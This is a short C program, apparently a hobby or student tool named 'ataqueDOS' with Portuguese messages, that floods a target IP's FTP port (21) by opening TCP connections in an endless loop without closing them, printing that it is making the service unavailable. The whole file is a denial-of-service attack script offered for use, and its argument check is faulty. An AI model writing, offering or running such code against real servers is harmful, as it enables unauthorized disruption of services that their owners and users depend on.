#include<stdio.h>
#include<netdb.h>

int main (int argc, char * argv[]){
	if(argc<1){
		printf("Erro. Exemplo de uso: ./ataqueDOS 127.0.0.1\n");
	}else{
		int c=1;
		int meusocket,conecta;
		struct sockaddr_in alvo;


		while(c != 0){

			meusocket = socket(AF_INET, SOCK_STREAM,0);
			alvo.sin_family = AF_INET;

			alvo.sin_port = htons(21);
			alvo.sin_addr.s_addr = inet_addr(argv[1]);
		
			conecta = connect(meusocket,(struct sockaddr *)&alvo,sizeof alvo);
		
			printf("Tornando o serviço indisponivel...\n");
		}
	}
}
